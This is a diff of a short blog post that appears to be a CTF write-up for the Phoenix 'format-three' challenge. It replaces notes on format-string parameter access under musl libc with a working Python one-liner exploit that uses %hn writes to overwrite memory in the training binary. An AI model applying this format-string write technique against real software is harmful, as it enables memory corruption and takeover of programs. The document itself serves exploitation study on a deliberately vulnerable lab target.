@@ -1,1 +1,6 @@
-<p>I use the book “The Shellcoder’s Handbook: Discovering and Exploiting Security Holes” as a textbook for this CTF. It presents the direct paramater access in a format string to skip over format arguments. However, this is not supported in the c library used for this prorgam since it uses ‘musl’ libc library. If you want to use <code class="language-plaintext highlighter-rouge">%i%n</code> the ith arguemnt. You must first have referenced %1$n %2$n … %(i-1)$n.</p>
+<p><code class="language-plaintext highlighter-rouge">python
+python -c 'import sys; sys.stdout.write("%x"*17 + "%25560x" + "A"*3 + "%hn" + "%5120x" + "%hn" + "\x92\x0a\x60\x00\x00\x00\x00\x00" + "A"*8 +"\x90\x0a\x60\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/format-three</code></p>
+
+<p>Written all by myself</p>
+
+<p>it first writes to the high two bytes then to the lowest two bytes because the hex in the high two bytes are smaller than the lowest two bytes.</p>
